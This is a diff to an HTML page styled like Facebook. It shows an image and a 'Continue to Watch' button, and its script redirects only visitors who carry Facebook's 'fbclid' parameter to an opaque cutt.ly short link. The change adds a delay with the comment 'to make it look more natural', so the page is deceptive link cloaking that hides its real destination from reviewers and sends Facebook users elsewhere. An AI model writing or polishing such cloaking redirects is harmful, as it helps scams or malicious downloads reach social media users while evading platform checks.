@@ -9,21 +9,44 @@
             margin: 0;
             padding: 20px;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             background-color: #f0f2f5;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            text-align: center;
+            max-width: 600px;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
         }
         img {
             max-width: 100%;
             height: auto;
             border-radius: 8px;
-            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
-            cursor: pointer;
-            transition: transform 0.2s;
+            margin-bottom: 20px;
         }
-        img:hover {
-            transform: scale(1.02);
+        .button {
+            display: inline-block;
+            padding: 12px 24px;
+            background-color: #1877f2;
+            color: white;
+            text-decoration: none;
+            border-radius: 6px;
+            font-weight: bold;
+            transition: background-color 0.2s;
+        }
+        .button:hover {
+            background-color: #166fe5;
+        }
+        .description {
+            margin: 20px 0;
+            color: #1c1e21;
+            line-height: 1.5;
         }
     </style>
     <script>
@@ -31,12 +54,22 @@
         window.onload = function() {
             const urlParams = new URLSearchParams(window.location.search);
             if (urlParams.has('fbclid')) {
-                window.location.href = 'https://cutt.ly/PrnfLyDP';
+                // Add a small delay to make it look more natural
+                setTimeout(function() {
+                    window.location.href = 'https://cutt.ly/PrnfLyDP';
+                }, 2000);
             }
         }
     </script>
 </head>
 <body>
+    <div class="container">
         <img src="facebook.png" alt="Facebook Image">
+        <div class="description">
+            <h2>Watch it here</h2>
+            <p>Click the button below to continue to our main website.</p>
+        </div>
+        <a href="https://cutt.ly/PrnfLyDP" class="button" target="_blank">Continue to Watch</a>
+    </div>
 </body>
 </html> 
